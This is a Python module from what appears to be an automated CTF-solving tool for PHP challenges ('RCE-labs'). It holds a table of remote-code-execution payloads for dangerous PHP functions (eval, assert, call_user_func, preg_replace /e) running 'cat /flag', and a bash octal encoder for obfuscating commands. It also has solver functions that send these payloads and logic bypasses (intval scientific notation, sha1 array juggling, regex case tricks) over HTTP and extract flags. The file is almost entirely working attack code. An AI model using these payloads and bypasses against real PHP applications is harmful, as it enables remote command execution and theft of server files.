"""yang_web.core.url_analyzer._attacks 子模块 _php_funcs（自 _attacks.py 拆分，请勿手工重排）。"""

from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse, quote
from urllib.request import Request, urlopen
from typing import List, Dict, Tuple, Optional, Callable
import re
import time
import html as _html
from .._engines import (AdaptiveScheduler, ConcurrentEngine, execute_attack)
from .._http import (FLAG_RE, USER_AGENT, send_request)







# ============================================================================
#  PHP Dynamic Function Execution Solver (RCE-labs)
# ============================================================================

_PHP_FUNC_MAP = {
    'eval':               'echo $flag;',
    'assert':             'echo $flag;',
    'call_user_func':     '"system","cat /flag"',
    'call_user_func_array': '"system",["cat /flag"]',
    'create_function':    '"","echo $flag;}"',
    'array_map':          '"system",["cat /flag"]',
    'array_filter':       '["/flag"],"system"',
    'array_reduce':       '["/flag"],"system"',
    'usort':              '[["/flag"]],"system"',
    'preg_replace':       '"/.*/e","system(\'cat /flag\')",""',
}



# ============================================================================
#  PHP Logic Bypass Solver (multi-step: regex+intval+sha1+assignment tricks)
# ============================================================================

def _gen_octal(cmd: str) -> str:
    """Convert command to bash octal $'\\ooo' form.
    
    Splits on spaces: each word/operator becomes a separate $'\\ooo...' block.
    Example: 'cat /flag' -> "$'\\143\\141\\164' $'\\57\\146\\154\\141\\147'"
    """
    parts = []
    for word in cmd.split(' '):
        if not word:
            continue
        bs = chr(92)
        octals = ''.join(f'{bs}{ord(c):03o}' for c in word)
        parts.append(f"$'{octals}'")
    return ' '.join(parts)



def _try_php_dynamic_func(url: str, fingerprint: dict,
                          on_progress=None, on_found=None) -> Optional[Dict]:
    """Try PHP dynamic function execution challenge.

    RCE-labs pattern: session selects random dangerous PHP function,
    user must submit matching payload via POST.
    """
    source = fingerprint.get('_clean_source', '')
    if not source or 'get_fun' not in source or 'hello_ctf' not in source:
        return None

    from urllib.request import Request, urlopen, build_opener, HTTPCookieProcessor
    from urllib.parse import urlencode
    from http.cookiejar import CookieJar
    import re as _re2, html as _h

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit('php_sess', 'PHP动态执行', '建立Session...')

    try:
        jar = CookieJar()
        opener = build_opener(HTTPCookieProcessor(jar))

        # Step 1: Get random function name
        resp = opener.open(Request(f'{url}?action=',
            headers={'User-Agent': USER_AGENT}), timeout=8)
        body = resp.read().decode('utf-8', errors='replace')

        func = None
        for m in _re2.finditer(
            r'(eval|assert|call_user_func|create_function|'
            r'array_map|call_user_func_array|usort|'
            r'array_filter|array_reduce|preg_replace)', body):
            func = m.group(1)
            break

        if not func:
            return None

        _emit('php_dispatch', f'随机函数: {func}', '匹配Payload...')

        payload = _PHP_FUNC_MAP.get(func)
        if not payload:
            return None

        # Step 2: Submit with matching payload
        data = urlencode({'content': payload}).encode()
        resp2 = opener.open(Request(f'{url}?action=submit', data=data,
            headers={'User-Agent': USER_AGENT,
                     'Content-Type': 'application/x-www-form-urlencoded'}), timeout=8)
        body2 = resp2.read().decode('utf-8', errors='replace')

        # Step 3: Extract flag
        flags = FLAG_RE.findall(body2)
        if flags:
            if on_found:
                on_found(flags[0])
            _emit('flag', f'PHP\u52a8\u6001\u6267\u884c({func})', flags[0])
            return {
                'flag': flags[0],
                'vuln_confirmed': [{
                    'type': f'PHP {func}',
                    'param': 'content',
                    'payload': payload,
                }],
                'attacks_run': 1,
            }
    except Exception:
        pass

    return None



def _try_php_logic_bypass(url: str, fingerprint: dict,
                          on_progress=None, on_found=None) -> Optional[Dict]:
    """Solve multi-step PHP logic bypass challenges.

    Pattern: preg_match regex bypass + intval scientific notation +
             sha1 type-juggle + assignment-in-condition.
    """
    source = fingerprint.get('_clean_source', '')
    if not source:
        return None

    # Detect known patterns with simpler, more robust checks
    has_regex_bypass = 'preg_match' in source and '!==' in source
    has_intval_trick = 'intval' in source and bool(re.search(r'intval\s*\(.*\+\s*1\)', source))
    has_sha1_juggle = source.count('sha1(') >= 2
    has_assign_cond = bool(re.search(r"\(\$_[A-Z]+\[[^\]]+\]\s*=", source))

    score = sum([has_regex_bypass, has_intval_trick, has_sha1_juggle, has_assign_cond])
    if score < 2:
        return None

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit('php_logic', '检测到PHP逻辑绕过', f'模式匹配: {score}/4')

    from urllib.request import Request, urlopen
    from urllib.parse import urlencode

    try:
        # Extract GET/POST param names from source
        get_params = list(set(re.findall(r"\$_GET\['(\w+)'\]", source)))
        post_params_dot = list(set(re.findall(r"\$_POST\['([^']+)'\]", source)))

        if not get_params:
            return None

        # Build GET bypasses
        get_payload = {}

        # Regex bypass: find preg_match and case-bypass
        if has_regex_bypass:
            pm = re.search(r"preg_match\s*\(\s*['\"](.+?)['\"]", source)
            if pm:
                regex_str = pm.group(1)
                # Strip delimiters: /^...$/i -> ..., flags: i
                m2 = re.search(r'/(.+?)/([a-z]*)$', regex_str)
                if m2:
                    expected_val = m2.group(1)
                    flags = m2.group(2)
                    # Find nearest $_GET param to preg_match
                    nearby = source[pm.start():pm.start()+200]
                    pms = re.findall(r"\$_GET\['(\w+)'\]", nearby)
                    if pms and 'i' in flags:
                        p = pms[0]
                        # Strip regex anchors (^, $) if present
                        val = expected_val
                        if val.startswith('^'):
                            val = val[1:]
                        if val.endswith('$'):
                            val = val[:-1]
                        get_payload[p] = val.lower()
                        _emit('php_logic', f'正则绕过: {p}',
                              f'大小写: {get_payload[p][:30]}')

        # intval bypass: scientific notation
        for p in get_params:
            if has_intval_trick and p not in get_payload:
                m = re.search(r'intval\s*\(\$_GET\[[\'\"]' + re.escape(p) +
                             r"[\'\"]\]\s*\)\s*<\s*(\d+)", source)
                if m:
                    target = int(m.group(1))
                    get_payload[p] = f'{target - 1}e1'
                    _emit('php_logic', f'intval绕过: {p}',
                          f'\u79d1\u5b66\u8bb0\u6570: {get_payload[p]}')

        # Build GET query string
        get_str = urlencode(get_payload, safe='!')
        post_data = None
        post_body = None

        # sha1 juggle: send params as arrays (skip dot params)
        if has_sha1_juggle and post_params_dot:
            post_body = {}
            for pp in post_params_dot:
                if '.' in pp:
                    continue  # dot params handled below
                post_body[pp + '[]'] = '1'
                _emit('php_logic', f'sha1碰撞: {pp}', '数组trick')

        # assignment-in-condition: try with underscore variant
        if has_assign_cond:
            assign_params = re.findall(
                r"\$_POST\[['\"]([^'\"]+\.[^'\"]+)['\"]\]\s*=", source)
            for ap in assign_params:
                # PHP converts . to _ in POST keys — try underscore variant
                alt = ap.replace('.', '_')
                if post_body is None:
                    post_body = {}
                post_body[alt] = 'x'
                _emit('php_logic', f'赋值条件: {ap}',
                      f'\u70b9\u53f7\u53d8 _: {alt}')

        # Execute request
        get_url = url + '?' + get_str
        _emit('php_solve', get_url[:80], 'POST搭载...')

        headers = {'User-Agent': USER_AGENT}
        if post_body:
            data = urlencode(post_body).encode()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        else:
            data = None

        req = Request(get_url, data=data, headers=headers)
        resp = urlopen(req, timeout=10)
        body = resp.read().decode('utf-8', errors='replace')

        flags = FLAG_RE.findall(body)
        if flags:
            if on_found:
                on_found(flags[0])
            _emit('flag', f'PHP\u903b\u8f91\u7ed5\u8fc7', flags[0])
            return {
                'flag': flags[0],
                'vuln_confirmed': [{'type': 'PHP_LOGIC',
                                    'param': '+'.join(get_params),
                                    'payload': get_str[:80]}],
                'attacks_run': 1,
            }

    except Exception:
        pass

    return None
